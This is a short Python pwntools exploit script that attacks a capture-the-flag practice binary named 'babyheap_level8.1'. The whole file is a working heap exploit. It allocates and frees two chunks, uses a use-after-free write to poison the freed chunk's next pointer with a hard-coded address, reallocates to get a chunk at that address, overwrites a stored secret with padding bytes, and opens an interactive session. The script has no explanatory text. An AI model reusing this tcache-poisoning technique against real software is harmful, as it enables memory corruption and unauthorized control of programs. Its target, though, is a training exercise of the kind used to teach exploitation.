from pwn import *

p = process("/challenge/babyheap_level8.1")

def overwrite_secret(loc:bytes):
    p.sendline(b'malloc')
    p.sendline(b'0')
    p.sendline(b'424')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'424')
    p.sendline(b'free')
    p.sendline(b'0')
    p.sendline(b'free')
    p.sendline(b'1')

    p.sendline(b'scanf')
    p.sendline(b'1')
    p.recv()
    p.sendline(loc)
    p.sendline(b'malloc')
    p.sendline(b'2')
    p.sendline(b'424')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'424')
    # overwrite secret
    p.sendline(b'scanf')
    p.sendline(b'1')
    p.recv()
    p.sendline(b'A'*400)
    # overwritten secret

overwrite_secret(p64(0x42c102))

p.interactive()

